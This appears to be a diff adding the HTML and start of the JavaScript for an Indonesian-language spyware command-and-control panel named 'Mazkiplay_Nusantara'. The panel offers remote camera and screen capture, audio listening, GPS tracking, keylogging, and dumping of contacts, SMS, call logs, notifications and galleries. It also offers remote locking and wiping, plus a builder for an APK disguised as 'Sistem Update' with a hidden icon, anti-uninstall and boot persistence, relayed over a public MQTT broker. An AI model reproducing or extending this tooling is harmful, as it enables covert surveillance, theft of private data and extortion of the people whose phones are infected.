@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#03060a">
+<title>Mazkiplay_Nusantara — Live C2</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#03060a;--ln:#0d2b23;--acc:#00ffa3;--ac2:#00c8ff;--red:#ff2d55;--amb:#ffb020;--txt:#b6d8ce;--dim:#4a6b63}
+html,body{height:100%}
+body{background:var(--bg);color:var(--txt);font:13px/1.5 'JetBrains Mono',ui-monospace,monospace;overflow-x:hidden}
+#shell{position:relative;min-height:100vh;background:var(--bg);overflow:hidden}
+#rain{position:fixed;inset:0;width:100%;height:100%;opacity:.22;z-index:0;pointer-events:none}
+#scan{position:fixed;inset:0;z-index:70;pointer-events:none;background:repeating-linear-gradient(180deg,rgba(0,255,163,.04) 0 1px,transparent 1px 3px)}
+#gate{position:fixed;inset:0;z-index:90;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(ellipse at 50% 0,#06231c,#03060a 62%)}
+#gate.out{animation:gO .6s forwards}@keyframes gO{to{opacity:0;transform:scale(1.1);filter:blur(7px);visibility:hidden}}
+.gcard{width:100%;max-width:380px;background:linear-gradient(180deg,rgba(8,20,16,.96),rgba(3,8,10,.98));border:1px solid #12483a;border-radius:14px;padding:24px 18px 20px;text-align:center;position:relative;box-shadow:0 0 60px rgba(0,255,163,.15)}
+.skull{width:104px;height:104px;margin:0 auto 4px;display:block;filter:drop-shadow(0 0 14px rgba(0,255,163,.65))}
+.bone{fill:#0f2a24;stroke:#00ffa3;stroke-width:2.4}
+.socket{fill:#00ffa3;animation:eye 2.6s infinite}.socket.b{animation-delay:1.3s}
+@keyframes eye{0%,88%,100%{opacity:1}90%,94%{opacity:.12}}
+.nose{fill:#00ffa3;opacity:.8}.sg{transform-origin:100px 100px;animation:hov 4s ease-in-out infinite}
+@keyframes hov{50%{transform:translateY(-6px)}}
+.brand{font-size:13.5px;font-weight:800;letter-spacing:2px;color:var(--acc);text-shadow:0 0 18px rgba(0,255,163,.7)}
+.brand small{display:block;font-size:8.5px;letter-spacing:4px;color:var(--dim);font-weight:400;margin-top:5px}
+.hr{height:1px;background:linear-gradient(90deg,transparent,#12483a,transparent);margin:14px 0}
+.lbl{font-size:9px;letter-spacing:2.4px;color:var(--dim);text-align:left;margin-bottom:6px}
+.pw input{width:100%;background:#040b09;border:1px solid #12483a;border-radius:8px;padding:13px;color:var(--acc);font:600 17px/1 'JetBrains Mono',monospace;letter-spacing:8px;text-align:center;outline:0}
+.gbtn{width:100%;margin-top:11px;background:linear-gradient(180deg,#00ffa3,#00c17a);border:0;border-radius:8px;padding:13px;color:#02110c;font:800 12px/1 'JetBrains Mono',monospace;letter-spacing:3px;cursor:pointer}
+#warn{margin-top:12px;font-size:10.5px;line-height:1.6;color:var(--red);min-height:30px}
+.gcard.shake{animation:shk .4s}@keyframes shk{10%,90%{transform:translateX(-3px)}20%,80%{transform:translateX(5px)}30%,50%,70%{transform:translateX(-8px)}40%,60%{transform:translateX(8px)}}
+.gcard.err{border-color:var(--red);box-shadow:0 0 60px rgba(255,45,85,.3)}
+#flash{position:fixed;inset:0;z-index:95;background:rgba(255,45,85,.3);opacity:0;pointer-events:none}
+#flash.on{animation:fl .5s}@keyframes fl{0%{opacity:1}100%{opacity:0}}
+.foot{margin-top:12px;font-size:8.5px;color:#2f4d45;letter-spacing:1.6px}
+#splash{position:fixed;inset:0;z-index:88;display:none;flex-direction:column;align-items:center;justify-content:center;gap:12px;background:#03060a;text-align:center;padding:20px}
+#splash.on{display:flex}
+#splash .big{font:800 16px/1.6 'JetBrains Mono',monospace;letter-spacing:3px;color:var(--acc);text-shadow:0 0 26px rgba(0,255,163,.85)}
+#splash .sub{font-size:9.5px;letter-spacing:5px;color:var(--dim)}
+#app{position:relative;z-index:2;display:none;min-height:100vh;grid-template-columns:200px 1fr}
+#app.on{display:grid}
+aside{background:linear-gradient(180deg,#050d0b,#03080a);border-right:1px solid var(--ln);padding:12px 9px;display:flex;flex-direction:column;gap:4px;position:sticky;top:0;height:100vh;overflow-y:auto}
+.abrand{display:flex;gap:7px;align-items:center;padding:4px 4px 10px;border-bottom:1px solid var(--ln);margin-bottom:8px}
+.abrand b{font-size:9.5px;color:var(--acc);letter-spacing:1.2px;line-height:1.25}
+.abrand span{display:block;font-size:7px;letter-spacing:2px;color:var(--dim)}
+aside button{display:flex;gap:7px;background:0;border:1px solid transparent;color:var(--dim);font:600 9.5px/1 'JetBrains Mono',monospace;letter-spacing:1.1px;padding:9px 8px;border-radius:7px;cursor:pointer;text-align:left}
+aside button:hover{color:var(--txt);background:#08130f}
+aside button.on{background:rgba(0,255,163,.12);border-color:var(--acc);color:var(--acc)}
+aside .sep{margin-top:auto;padding-top:9px;border-top:1px solid var(--ln);font-size:7.5px;color:#2f4d45;line-height:1.7}
+#main{min-width:0;padding-bottom:50px}
+header{position:sticky;top:0;z-index:40;background:rgba(3,8,10,.96);border-bottom:1px solid var(--ln);padding:9px 12px;display:flex;gap:8px;align-items:center;flex-wrap:wrap;backdrop-filter:blur(8px)}
+.pill{display:flex;align-items:center;gap:5px;font-size:8.5px;letter-spacing:1.1px;border:1px solid #14503f;border-radius:20px;padding:4px 8px;color:var(--acc);background:rgba(0,255,163,.06)}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--acc);animation:bl 1.4s infinite}
+@keyframes bl{50%{opacity:.2}}
+#devsel{background:#06100d;border:1px solid var(--ln);color:var(--acc);font:600 9.5px 'JetBrains Mono',monospace;padding:7px;border-radius:7px;max-width:180px}
+main{padding:12px;max-width:1200px;margin:0 auto}
+.pan{display:none}.pan.on{display:block}
+.grid{display:grid;gap:10px;grid-template-columns:repeat(auto-fit,minmax(235px,1fr))}
+.card{background:linear-gradient(180deg,rgba(9,20,17,.92),rgba(4,9,11,.95));border:1px solid var(--ln);border-radius:11px;overflow:hidden;position:relative}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,255,163,.5),transparent)}
+.ch{display:flex;align-items:center;gap:7px;padding:9px 11px;border-bottom:1px solid #0b201b;background:rgba(0,255,163,.03)}
+.ch h3{font-size:9px;letter-spacing:1.7px;color:var(--acc);text-transform:uppercase}
+.ch .n{margin-left:auto;font-size:8px;color:var(--dim);border:1px solid var(--ln);border-radius:5px;padding:2px 6px}
+.cb{padding:11px}
+.btn{background:#08150f;border:1px solid #14503f;color:var(--acc);font:600 9px/1 'JetBrains Mono',monospace;letter-spacing:1.1px;padding:8px 9px;border-radius:6px;cursor:pointer}
+.btn:hover{background:rgba(0,255,163,.14)}
+.btn.red{border-color:#5c1226;color:var(--red);background:#140609}
+.btn.ghost{border-color:var(--ln);color:var(--dim);background:transparent}
+.btn.wide{width:100%}.btn:disabled{opacity:.4}
+.acts{display:flex;gap:5px;flex-wrap:wrap}
+.kv{display:flex;justify-content:space-between;gap:8px;font-size:10px;padding:4px 0;border-bottom:1px dashed #0c221c}
+.kv:last-child{border:0}.kv span{color:var(--dim);font-size:9px}.kv b{text-align:right;word-break:break-all}
+.kv b.ok{color:var(--acc)}.kv b.wr{color:var(--amb)}.kv b.bad{color:var(--red)}
+.view{width:100%;aspect-ratio:4/3;background:#02070a;border:1px solid #0b201b;border-radius:8px;display:block;object-fit:cover}
+.vw{position:relative;border-radius:8px;overflow:hidden}
+.vw .bd{position:absolute;top:6px;left:6px;font-size:7.5px;background:rgba(0,0,0,.78);border:1px solid #14503f;color:var(--acc);padding:2px 5px;border-radius:4px}
+.thumbs{display:grid;grid-template-columns:repeat(auto-fill,minmax(66px,1fr));gap:5px;max-height:240px;overflow-y:auto}
+.th{position:relative;border:1px solid #0b201b;border-radius:6px;overflow:hidden;aspect-ratio:1;background:#040b0e}
+.th img{width:100%;height:100%;object-fit:cover;cursor:zoom-in;display:block}
+.th .d{position:absolute;bottom:2px;right:2px;width:15px;height:15px;border-radius:4px;background:rgba(0,0,0,.82);color:var(--acc);border:1px solid #14503f;font-size:9px;display:flex;align-items:center;justify-content:center;cursor:pointer}
+.empty{font-size:9.5px;color:#2f4d45;text-align:center;padding:13px}
+#mapc{width:100%;height:180px;display:block;border-radius:8px;border:1px solid #0b201b;background:#02080a}
+.bar{height:7px;background:#0a1a16;border-radius:4px;overflow:hidden;border:1px solid #0d2b23}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--acc),var(--ac2))}
+.list{max-height:230px;overflow-y:auto}
+.row{display:flex;gap:7px;padding:6px 0;border-bottom:1px solid #0a1e19;font-size:10px}
+.row:last-child{border:0}
+.av{width:21px;height:21px;border-radius:50%;flex:none;background:#0d3a2c;border:1px solid #14503f;color:var(--acc);font-size:9px;display:flex;align-items:center;justify-content:center;font-weight:800}
+.row .t{flex:1;min-width:0}.row .t b{display:block;font-size:10px}
+.row .t p{color:var(--dim);font-size:9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.row .tm{font-size:7.5px;color:#2f4d45}
+.bub{max-width:82%;padding:6px 9px;border-radius:8px;font-size:10px;margin-bottom:5px;background:#0a1c17;border:1px solid #0d2b23}
+#console{background:#02070a;border:1px solid #0b201b;border-radius:8px;height:230px;overflow-y:auto;padding:8px;font-size:9px;line-height:1.7}
+#console .l{display:block;color:#5f8479;word-break:break-all}
+#console .l.err{color:var(--red)}#console .l.ok{color:var(--acc)}
+#keybuf{background:#02070a;border:1px solid #0b201b;border-radius:8px;min-height:70px;max-height:170px;overflow-y:auto;padding:8px;font-size:10px;color:var(--acc);word-break:break-all}
+#wave{width:100%;height:80px;display:block;background:#02070a;border:1px solid #0b201b;border-radius:8px}
+input[type=text],textarea,select{width:100%;background:#040b09;border:1px solid #12483a;border-radius:7px;padding:9px;color:var(--acc);font:600 11px 'JetBrains Mono',monospace;outline:0}
+textarea{resize:vertical;font-weight:400;line-height:1.6}
+label.fl{display:block;font-size:8.5px;letter-spacing:1.6px;color:var(--dim);margin:9px 0 4px;text-transform:uppercase}
+.sw{display:flex;align-items:center;gap:8px;padding:6px 0;font-size:10px;cursor:pointer}
+.sw input{accent-color:#00ffa3;width:15px;height:15px}
+table{width:100%;border-collapse:collapse;font-size:9px}
+th{text-align:left;color:var(--dim);padding:4px 3px;border-bottom:1px solid #0b201b;font-size:8px}
+td{padding:5px 3px;border-bottom:1px solid #081815;word-break:break-all}
+.note{font-size:9px;color:#3d5f56;line-height:1.7}
+pre{background:#02070a;border:1px solid #0b201b;border-radius:7px;padding:8px;overflow-x:auto;font-size:8.5px;color:#6f9a8d;line-height:1.65}
+#toast{position:fixed;bottom:14px;left:50%;transform:translateX(-50%);z-index:80;display:flex;flex-direction:column;gap:5px;align-items:center;pointer-events:none;width:calc(100% - 26px);max-width:330px}
+.tst{background:rgba(4,16,12,.97);border:1px solid var(--acc);color:var(--acc);font-size:9.5px;padding:8px 11px;border-radius:7px}
+.tst.err{border-color:var(--red);color:var(--red)}
+#modal{position:fixed;inset:0;z-index:85;background:rgba(0,4,6,.95);display:none;align-items:center;justify-content:center;padding:14px}
+#modal.on{display:flex}
+#modal .box{max-width:100%;max-height:90vh;border:1px solid #14503f;border-radius:10px;overflow:hidden;background:#04090c}
+#modal img,#modal video{max-width:100%;max-height:76vh;display:block}
+#modal .mbar{display:flex;gap:5px;padding:7px;border-top:1px solid #0b201b}
+.dcard{background:linear-gradient(180deg,rgba(9,20,17,.92),rgba(4,9,11,.95));border:1px solid var(--ln);border-radius:10px;padding:10px;position:relative;cursor:pointer}
+.dcard.on{border-color:var(--acc);box-shadow:0 0 18px rgba(0,255,163,.25)}
+.dcard .dn{font-size:10.5px;color:var(--acc);font-weight:700}
+.dcard .dm{font-size:8.5px;color:var(--dim);margin-top:3px}
+.dcard .dx{position:absolute;top:6px;right:6px;color:var(--red);font-size:10px;background:rgba(0,0,0,.7);border:1px solid #5c1226;border-radius:4px;width:16px;height:16px;display:flex;align-items:center;justify-content:center}
+#logbuild{background:#02070a;border:1px solid #0b201b;border-radius:7px;height:140px;overflow-y:auto;padding:7px;font-size:8.5px;line-height:1.7;color:#5f8479}
+#logbuild .ok{color:var(--acc)}#logbuild .er{color:var(--red)}
+#iconPrev{width:54px;height:54px;border-radius:11px;border:1px solid #14503f;background:#050f0c;object-fit:cover}
+@media(max-width:880px){
+ #app{grid-template-columns:1fr}
+ aside{position:sticky;top:0;height:auto;flex-direction:row;overflow-x:auto;gap:4px;padding:8px;border-right:0;border-bottom:1px solid var(--ln);z-index:45}
+ .abrand,.sep{display:none}
+ aside button{flex:none;white-space:nowrap}
+ header{top:44px}
+}
+</style>
+<script src="https://unpkg.com/mqtt@5.10.1/dist/mqtt.min.js"></script>
+</head>
+<body>
+<div id="shell">
+<canvas id="rain"></canvas><div id="scan"></div><div id="flash"></div>
+
+<div id="gate">
+  <div class="gcard" id="gcard">
+    <svg class="skull" viewBox="0 0 200 200"><g class="sg">
+      <path class="bone" d="M100 18c-39 0-64 27-64 62 0 21 8 34 17 42 4 4 6 9 6 15v5c0 6 5 11 11 11h7v9c0 6 5 11 11 11h24c6 0 11-5 11-11v-9h7c6 0 11-5 11-11v-5c0-6 2-11 6-15 9-8 17-21 17-42 0-35-25-62-64-62z"/>
+      <ellipse class="socket" cx="74" cy="84" rx="18" ry="21"/><ellipse class="socket b" cx="126" cy="84" rx="18" ry="21"/>
+      <path class="nose" d="M100 106l-10 20h20z"/>
+      <g fill="none" stroke="#00ffa3" stroke-width="2.2"><path d="M84 140v14M100 140v14M116 140v14"/></g></g></svg>
+    <div class="brand">MAZKIPLAY_NUSANTARA<small>ADMIN CONTROL · LIVE</small></div>
+    <div class="hr"></div>
+    <div class="lbl">&gt; MASUKKAN KATA SANDI</div>
+    <div class="pw"><input id="pw" type="password" inputmode="numeric" maxlength="12" autocomplete="off" placeholder="••••••"></div>
+    <button class="gbtn" id="enter">BUKA PANEL</button>
+    <div id="warn"></div>
+    <div class="foot">MQTT/TLS RELAY · v4.0 · MAX 20</div>
+  </div>
+</div>
+
+<div id="splash">
+  <div class="big">WELCOME TO<br>MAZKIPLAY_NUSANTARA ☠️</div>
+  <div class="sub">SELAMAT DATANG DI HANGATNYA</div>
+  <div class="sub" id="splashmsg">MENYAMBUNG RELAY...</div>
+</div>
+
+<div id="app">
+  <aside>
+    <div class="abrand"><div><b>MAZKIPLAY<br>NUSANTARA</b><span>C2 ADMIN</span></div></div>
+    <button data-p="dash" class="on">◈ DASHBOARD</button>
+    <button data-p="dev">▣ DEVICE</button>
+    <button data-p="live">◉ LIVE VIEW</button>
+    <button data-p="ctrl">✦ KONTROL</button>
+    <button data-p="lock">🔒 LAYAR KUNCI</button>
+    <button data-p="dump">▦ DUMP DATA</button>
+    <button data-p="info">⚙ INFO</button>
+    <button data-p="build">⚡ BUILD APK</button>
+    <button data-p="relay">⛓ RELAY</button>
+    <button data-p="log">≡ LOG</button>
+    <div class="sep">RELAY: <span id="relSt">—</span><br><span id="dcount">0/20</span></div>
+  </aside>
+  <div id="main">
+    <header>
+      <div class="pill"><i class="dot"></i><span id="linkstate">OFFLINE</span></div>
+      <select id="devsel"><option>— TANPA DEVICE —</option></select>
+      <span style="margin-left:auto;font-size:9px;color:var(--dim)" id="clock">--:--:--</span>
+    </header>
+    <main>
+      <section class="pan on" data-p="dash">
+        <div class="grid">
+          <div class="card"><div class="ch"><h3>Status</h3></div><div class="cb">
+            <div class="kv"><span>RELAY</span><b id="stRelay">—</b></div>
+            <div class="kv"><span>DEVICE</span><b id="stDev">0/20</b></div>
+            <div class="kv"><span>UPTIME</span><b id="stUp">00:00:00</b></div>
+            <div class="kv"><span>SANDI</span><b class="ok">211421</b></div>
+          </div></div>
+          <div class="card"><div class="ch"><h3>Data</h3></div><div class="cb">
+            <div class="kv"><span>FOTO</span><b id="cPhoto">0</b></div>
+            <div class="kv"><span>DUMP</span><b id="cDump">0</b></div>
+            <div class="kv"><span>KEYLOG</span><b id="cKey">0</b></div>
+            <div class="acts" style="margin-top:9px"><button class="btn wide" id="dlAll">⤓ SEMUA</button><button class="btn red wide" id="wipeAll">✖ BERSIHKAN</button></div>
+          </div></div>
+          <div class="card"><div class="ch"><h3>Aksi</h3></div><div class="cb"><div class="acts">
+            <button class="btn" data-q="snapB">◉ BELAKANG</button><button class="btn" data-q="snapF">◉ DEPAN</button>
+            <button class="btn" data-q="gps">⌖ GPS</button><button class="btn" data-q="scr">▤ LAYAR</button>
+            <button class="btn" data-q="aud">♪ AUDIO</button><button class="btn" data-q="dumpAll">▦ DUMP</button></div>
+          </div></div>
+          <div class="card"><div class="ch"><h3>Target</h3></div><div class="cb">
+            <div class="kv"><span>NAMA</span><b id="tName">—</b></div><div class="kv"><span>MODEL</span><b id="tDev">—</b></div>
+            <div class="kv"><span>IP</span><b id="tIp">—</b></div><div class="kv"><span>BATERAI</span><b id="tBat">—</b></div>
+            <div class="kv"><span>NET</span><b id="tNet">—</b></div></div></div>
+        </div>
+      </section>
+
+      <section class="pan" data-p="dev">
+        <div class="card"><div class="ch"><h3>Device</h3><span class="n" id="devN">0/20</span></div><div class="cb">
+          <div class="acts" style="margin-bottom:9px"><button class="btn" id="addLocal">+ DEVICE INI</button><button class="btn ghost" id="pingAll">⟳ PING</button></div>
+          <div class="grid" id="devGrid"></div>
+          <p class="note" style="margin-top:9px">Device dari APK muncul otomatis lewat relay. Maks 20.</p>
+        </div></div>
+      </section>
+
+      <section class="pan" data-p="live">
+        <div class="grid">
+          <div class="card"><div class="ch"><h3>Kamera Belakang</h3></div><div class="cb">
+            <div class="vw"><video class="view" id="vB" playsinline muted autoplay></video></div>
+            <div class="acts" style="margin-top:7px"><button class="btn" data-cam="photo" data-f="environment">◉ SNAP</button><button class="btn ghost" data-cam="live" data-f="environment">▷ LIVE</button><button class="btn ghost" data-cam="stop" data-f="environment">■</button></div></div></div>
+          <div class="card"><div class="ch"><h3>Kamera Depan</h3></div><div class="cb">
+            <div class="vw"><video class="view" id="vF" playsinline muted autoplay></video></div>
+            <div class="acts" style="margin-top:7px"><button class="btn" data-cam="photo" data-f="user">◉ SNAP</button><button class="btn ghost" data-cam="live" data-f="user">▷ LIVE</button><button class="btn ghost" data-cam="stop" data-f="user">■</button></div></div></div>
+          <div class="card"><div class="ch"><h3>Layar</h3><span class="n" id="scrSt">OFF</span></div><div class="cb">
+            <div class="vw"><video class="view" id="vS" playsinline muted autoplay></video></div>
+            <div class="acts" style="margin-top:7px"><button class="btn" id="scrOn">▷ MIRROR</button><button class="btn" id="scrSnap">◉ SNAP</button><button class="btn ghost" id="scrOff">■</button></div></div></div>
+          <div class="card"><div class="ch"><h3>Audio</h3><span class="n" id="aSt">OFF</span></div><div class="cb">
+            <canvas id="wave" width="540" height="160"></canvas>
+            <div class="acts" style="margin-top:7px"><button class="btn" id="aOn">▷ DENGAR</button><button class="btn" id="aRec">⏺ REC</button><button class="btn ghost" id="aOff">■</button></div></div></div>
+        </div>
+        <div class="card" style="margin-top:10px"><div class="ch"><h3>Lokasi</h3><span class="n" id="gpsSt">IDLE</span></div><div class="cb">
+          <canvas id="mapc" width="640" height="350"></canvas>
+          <div class="kv"><span>KOORDINAT</span><b id="gPos">—</b></div><div class="kv"><span>AKURASI</span><b id="gAcc">—</b></div>
+          <div class="acts" style="margin-top:7px"><button class="btn" id="gpsOn">▷ LACAK</button><button class="btn ghost" id="gpsOff">■</button><button class="btn ghost" id="gpsMaps">↗ MAPS</button></div></div></div>
+        <div class="card" style="margin-top:10px"><div class="ch"><h3>Tangkapan</h3><span class="n" id="capN">0</span></div><div class="cb"><div class="thumbs" id="capGrid"></div></div></div>
+      </section>
+
+      <section class="pan" data-p="ctrl">
+        <div class="card"><div class="ch"><h3>Kendali</h3><span class="n" id="ctrlDev">—</span></div><div class="cb">
+          <div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(128px,1fr))">
+            <button class="btn" data-c="vibrate">📳 GETAR</button><button class="btn" data-c="torch">🔆 LAMPU</button>
+            <button class="btn" data-c="ring">🔔 BUNYI</button><button class="btn" data-c="lock">🔒 KUNCI</button>
+            <button class="btn" data-c="screenshot">📸 SCREENSHOT</button><button class="btn" data-c="toast">💬 TOAST</button>
+            <button class="btn" data-c="open">🌐 URL</button><button class="btn ghost" data-c="clip">📋 CLIPBOARD</button>
+            <button class="btn ghost" data-c="gallery">🖼 GALERI</button><button class="btn red" data-c="wipe">🗑 HAPUS</button>
+          </div></div></div>
+        <div class="card" style="margin-top:10px"><div class="ch"><h3>Keylogger</h3><span class="n" id="kSt">ON</span></div><div class="cb">
+          <div id="keybuf"><span style="color:#2f4d45">menunggu...</span></div>
+          <div class="acts" style="margin-top:7px"><button class="btn" id="kPause">⏸</button><button class="btn ghost" id="kClr">✖</button><button class="btn" id="kDl">⤓</button></div></div></div>
+      </section>
+
+      <section class="pan" data-p="lock">
+        <div class="card"><div class="ch"><h3>Layar Kunci</h3></div><div class="cb">
+          <textarea id="lockHtml" rows="9"></textarea>
+          <div class="acts" style="margin-top:7px"><button class="btn" id="lockPrevBtn">◉ PREVIEW</button><button class="btn ghost" id="lockReset">↺ DEFAULT</button><button class="btn" id="lockPush">🔒 KUNCI SEKARANG</button></div>
+          <iframe id="lockPrev" style="border:0;width:100%;height:190px;background:#000;margin-top:9px;border-radius:7px"></iframe>
+        </div></div>
+      </section>
+
+      <section class="pan" data-p="dump">
+        <div class="grid">
+          <div class="card"><div class="ch"><h3>Kontak</h3><span class="n" id="nKon">0</span></div><div class="cb">
+            <div class="acts" style="margin-bottom:7px"><button class="btn" id="konSync">⟳ DUMP</button><button class="btn ghost" id="konDl">⤓</button></div>
+            <div class="list" id="konList"><div class="empty">KOSONG</div></div></div></div>
+          <div class="card"><div class="ch"><h3>SMS</h3><span class="n" id="nSms">0</span></div><div class="cb">
+            <div class="acts" style="margin-bottom:7px"><button class="btn" id="smsSync">⟳ DUMP</button><button class="btn ghost" id="smsDl">⤓</button></div>
+            <div class="list" id="smsList"><div class="empty">KOSONG</div></div></div></div>
+          <div class="card"><div class="ch"><h3>Notifikasi</h3><span class="n" id="nNot">0</span></div><div class="cb">
+            <div class="acts" style="margin-bottom:7px"><button class="btn" id="notSync">⟳ DUMP</button><button class="btn ghost" id="notDl">⤓</button></div>
+            <div class="list" id="notList"><div class="empty">KOSONG</div></div></div></div>
+          <div class="card" style="grid-column:1/-1"><div class="ch"><h3>Log Panggilan</h3><span class="n" id="nCall">0</span></div><div class="cb">
+            <div class="acts" style="margin-bottom:7px"><button class="btn" id="callSync">⟳ DUMP</button><button class="btn ghost" id="callDl">⤓</button></div>
+            <div style="overflow-x:auto"><table id="callT"><thead><tr><th>Nama</th><th>Nomor</th><th>Tipe</th><th>Durasi</th><th>Waktu</th></tr></thead><tbody></tbody></table></div></div></div>
+          <div class="card" style="grid-column:1/-1"><div class="ch"><h3>Galeri</h3><span class="n" id="nGal">0</span></div><div class="cb">
+            <div class="acts" style="margin-bottom:7px"><button class="btn" id="galSync">⟳ AMBIL</button></div>
+            <div class="thumbs" id="galGrid"></div></div></div>
+        </div>
+      </section>
+
+      <section class="pan" data-p="info">
+        <div class="grid">
+          <div class="card"><div class="ch"><h3>Identitas</h3></div><div class="cb">
+            <div class="kv"><span>MODEL</span><b id="iModel">—</b></div><div class="kv"><span>OS</span><b id="iOs">—</b></div>
+            <div class="kv"><span>BROWSER</span><b id="iBr">—</b></div><div class="kv"><span>LAYAR</span><b id="iScr">—</b></div>
+            <div class="kv"><span>CPU</span><b id="iCpu">—</b></div><div class="kv"><span>IP</span><b id="iIp">—</b></div>
+            <div class="acts" style="margin-top:8px"><button class="btn wide" id="infoDl">⤓</button></div></div></div>
+          <div class="card"><div class="ch"><h3>Baterai</h3><span class="n" id="bSt">—</span></div><div class="cb">
+            <div class="kv"><span>LEVEL</span><b id="bLvl">—</b></div><div class="bar" id="bBar"><i style="width:0"></i></div>
+            <div class="kv" style="margin-top:7px"><span>STATUS</span><b id="bChg">—</b></div></div></div>
+          <div class="card"><div class="ch"><h3>Jaringan</h3></div><div class="cb">
+            <div class="kv"><span>TIPE</span><b id="netT">—</b></div><div class="kv"><span>DOWNLINK</span><b id="netD">—</b></div>
+            <div class="kv"><span>IP</span><b id="netIp">—</b></div></div></div>
+          <div class="card"><div class="ch"><h3>Izin</h3></div><div class="cb"><div id="permList" class="note">—</div>
+            <button class="btn wide" style="margin-top:8px" id="permReq">⚡ MINTA IZIN</button></div></div>
+        </div>
+      </section>
+
+      <section class="pan" data-p="build">
+        <div class="grid" style="grid-template-columns:1fr 1fr">
+          <div class="card"><div class="ch"><h3>Konfigurasi APK</h3></div><div class="cb">
+            <label class="fl">NAMA</label><input id="fName" type="text" value="Sistem Update">
+            <label class="fl">PACKAGE</label><input id="fPkg" type="text" value="com.mazkiplay.nusantara">
+            <label class="fl">KODE AKSES</label><input id="fCode" type="text" value="211421">
+            <label class="fl">ROOM RELAY</label><input id="fRoom" type="text" readonly>
+            <label class="fl">ICON</label><div class="acts" style="align-items:center"><input id="fIcon" type="file" accept="image/*" style="flex:1"><img id="iconPrev"></div>
+            <label class="sw"><input type="checkbox" id="fHide" checked> Sembunyikan icon</label>
+            <label class="sw"><input type="checkbox" id="fAdmin" checked> Anti-uninstall</label>
+            <label class="sw"><input type="checkbox" id="fBoot" checked> Autostart reboot</label>
+            <label class="sw"><input type="checkbox" id="fScream" checked> Teriakan saat salah kode</label>
+          </div></div>
+          <div class="card"><div class="ch"><h3>HTML Dalam APK</h3></div><div class="cb">
+            <textarea id="fHtml" rows="12"></textarea>
+            <div class="acts" style="margin-top:7px"><button class="btn ghost" id="htmlTpl">↺ TEMPLATE</button></div>
+            <p class="note" style="margin-top:7px">Tampilan yang dilihat target setelah lolos kode.</p></div></div>
+        </div>
+        <div class="card" style="margin-top:10px"><div class="ch"><h3>Build</h3><span class="n" id="buildSt">IDLE</span></div><div class="cb">
+          <div class="acts"><button class="btn" id="buildBtn">⚡ BUILD ZIP PROJECT</button><button class="btn ghost" id="dlHtml">⤓ HTML</button></div>
+          <div id="logbuild" style="margin-top:8px"></div>
+          <p class="note" style="margin-top:8px">ZIP → push repo → Actions → artifact APK.</p></div></div>
+      </section>
+
+      <section class="pan" data-p="relay">
+        <div class="card"><div class="ch"><h3>Relay MQTT</h3></div><div class="cb">
+          <div class="kv"><span>STATUS</span><b id="relayS">—</b></div>
+          <div class="kv"><span>BROKER</span><b>broker.emqx.io</b></div>
+          <label class="fl">ROOM CODE</label><input id="roomIn" type="text">
+          <div class="acts" style="margin-top:7px"><button class="btn" id="roomNew">↺ ROOM BARU</button><button class="btn ghost" id="roomCopy">⧉ SALIN</button><button class="btn" id="roomSave">✓ SIMPAN &amp; SAMBUNG</button></div>
+          <p class="note" style="margin-top:9px">Room code ini yang dipakai APK. Broker publik — jangan pakai untuk data sangat sensitif tanpa enkripsi tambahan.</p>
+        </div></div>
+        <div class="card" style="margin-top:10px"><div class="ch"><h3>Format Pesan</h3></div><div class="cb">
+          <pre>up:   {"t":"photo","cam":"back","data":"&lt;b64&gt;"}
+down: {"cmd":"photo","cam":"back"}
+cmds: photo audio gps sms kon call notif
+      info lock vibrate torch toast open
+      gallery</pre></div></div>
+      </section>
+
+      <section class="pan" data-p="log">
+        <div class="card"><div class="ch"><h3>Console</h3></div><div class="cb">
+          <div id="console"></div>
+          <div class="acts" style="margin-top:7px"><button class="btn ghost" id="logDl">⤓</button><button class="btn red" id="logClr">✖</button></div></div></div>
+      </section>
+    </main>
+  </div>
+</div>
+
+<div id="toast"></div>
+<div id="modal"><div class="box"><div id="mbody"></div><div class="mbar"><button class="btn" id="mdl">⤓</button><button class="btn ghost" id="mclose">✖</button></div></div></div>
+</div>
+
+<script>
+(function(){
+"use strict";
+var PASS='211421',MAXDEV=20,BROKER='wss://broker.emqx.io:8084/mqtt';
+var $=function(s,r){return (r||document).querySelector(s);},$$=function(s,r){return [].slice.call((r||document).querySelectorAll(s));};
+
+var DB={p:'MZ4_',get:function(k,d){try{var v=localStorage.getItem(this.p+k);return v?JSON.parse(v):d;}catch(e){return d;}},
+ set:function(k,v){try{localStorage.setItem(this.p+k,JSON.stringify(v));}catch(e){}},
+ clear:function(){Object.keys(localStorage).filter(function(x){return x.indexOf(DB.p)===0;}).forEach(function(x){localStorage.removeItem(x);});}};
+var ROOM=DB.get('room',''),D=DB.get('devices',[]),CUR=DB.get('cur',''),LOG=DB.get('log',[]);
+function dev(id){return D.find(function(d){return d.id===id;});}
+function cur(){return dev(CUR);}
+function save(){DB.set('devices',D);DB.set('cur',CUR);DB.set('log',LOG.slice(-200));}
+function dd(){var d=cur();return d?d.data:{photos:[],videos:[],audio:[],keys:[],gps:[],kon:[],sms:[],not:[],call:[],gal:[]};}
+function pad(n){return n<10?'0'+n:''+n;}
+function ts(d){d=d||new Date();return pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());}
+function stamp(){var d=new Date();return d.getFullYear()+pad(d.getMonth()+1)+pad(d.getDate())+'_'+pad(d.getHours())+pad(d.getMinutes());}
+function log(m,c){var l='['+ts()+'] '+m;LOG.push({t:new Date().toISOString(),m:m});if(LOG.length>200)LOG.shift();save();
+ var c2=$('#console');if(!c2)return;var e=document.createElement('span');e.className='l '+(c||'');e.textContent=l;c2.appendChild(e);c2.scrollTop=c2.scrollHeight;}
+function toast(m,e){var t=document.createElement('div');t.className='tst'+(e?' err':'');t.textContent=m;$('#toast').appendChild(t);setTimeout(function(){t.remove();},2500);}
